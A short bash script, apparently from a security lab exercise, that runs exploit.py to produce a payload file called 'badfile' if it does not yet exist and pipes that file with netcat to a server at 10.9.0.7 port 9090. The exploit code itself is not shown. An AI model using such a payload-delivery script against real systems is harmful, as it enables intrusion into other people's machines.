#!/bin/bash
set -e

if [ ! -f "badfile" ]; then
    python3 exploit.py
fi

cat badfile | nc 10.9.0.7 9090
